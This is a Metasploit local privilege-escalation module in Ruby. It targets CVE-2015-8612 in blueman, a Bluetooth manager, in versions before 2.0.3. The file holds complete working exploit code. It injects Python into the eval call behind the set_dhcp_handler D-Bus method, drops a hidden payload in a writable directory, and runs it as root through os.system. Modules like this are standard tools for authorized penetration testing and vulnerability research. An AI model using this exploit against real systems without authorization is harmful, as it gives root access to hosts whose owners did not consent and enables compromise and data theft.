##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'blueman set_dhcp_handler D-Bus Privilege Escalation',
      'Description'    => %q{
        This module attempts to gain root privileges by exploiting a Python
        code injection vulnerability in blueman versions prior to 2.0.3.

        The `org.blueman.Mechanism.EnableNetwork` D-Bus interface exposes the
        `set_dhcp_handler` function which uses user input in a call to `eval`,
        without sanitization, resulting in arbitrary code execution as root.

        This module has been tested successfully with blueman version 1.23
        on Debian 8 Jessie (x64).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Sebastian Krahmer', # Discovery and exploit
          'bcoles'             # Metasploit
        ],
      'DisclosureDate' => '2015-12-18',
      'References'     =>
        [
          ['BID', '79688'],
          ['CVE', '2015-8612'],
          ['URL', 'https://twitter.com/thegrugq/status/677809527882813440'],
          ['URL', 'https://github.com/blueman-project/blueman/issues/416'],
          ['URL', 'https://www.openwall.com/lists/oss-security/2015/12/18/6'],
          ['URL', 'https://www.debian.org/security/2015/dsa-3427'],
          ['URL', 'https://bugs.mageia.org/show_bug.cgi?id=17361'],
          ['URL', 'http://www.slackware.com/security/viewer.php?l=slackware-security&y=2015&m=slackware-security.421085']
        ],
      'Platform'       => ['linux'],
      'Arch'           =>
        [
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
      'SessionTypes'   => ['shell', 'meterpreter'],
      'Targets'        => [['Auto', {}]],
      'DefaultTarget'  => 0))
    register_advanced_options [
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
    ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
  end

  def dbus_send(dest:, type:, path:, interface:, contents:)
    cmd_exec "dbus-send --system --print-reply --dest=#{dest} --type=#{type} #{path} #{interface} #{contents}"
  end

  def check
    unless command_exists? 'dbus-send'
      vprint_error 'dbus-send is not installed. Exploitation will fail.'
      return CheckCode::Safe
    end
    vprint_good 'dbus-send is installed'

    res = dbus_send(
      dest: 'org.blueman.Mechanism',
      type: 'method_call',
      path: '/',
      interface: 'org.freedesktop.DBus.Introspectable.Introspect',
      contents: ''
    )

    unless res.include? 'EnableNetwork'
      vprint_error 'org.blueman.Mechanism.EnableNetwork D-Bus interface is not available'
      return CheckCode::Safe
    end
    vprint_good 'org.blueman.Mechanism.EnableNetwork D-Bus interface is available'

    res = execute_python('')
    unless res.include? 'eval("nc.set_dhcp_handler(%s)" % dhcp_handler)'
      vprint_error 'Target is not vulnerable'
      return CheckCode::Safe
    end

    CheckCode::Vulnerable
  end

  def execute_python(code)
    dbus_send(
      dest: 'org.blueman.Mechanism',
      type: 'method_call',
      path: '/',
      interface: 'org.blueman.Mechanism.EnableNetwork',
      contents: "'string:[]' 'string:[]' 'string:#{code}'"
    )
  end

  def exploit
    if !datastore['ForceExploit'] && is_root?
      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    payload_name = ".#{rand_text_alphanumeric 10..15}"
    payload_path = "#{base_dir}/#{payload_name}"
    upload_and_chmodx payload_path, generate_payload_exe

    print_status 'Executing payload...'
    res = execute_python "os.system(\"#{payload_path}&\")"
    vprint_line res

    unless res.include? 'eval("nc.set_dhcp_handler(%s)" % dhcp_handler)'
      fail_with Failure::NotVulnerable, 'The target is not vulnerable'
    end

    if res.include? 'SyntaxError:'
      fail_with Failure::Unknown, 'Payload execution failed due to syntax error'
    end
  end
end
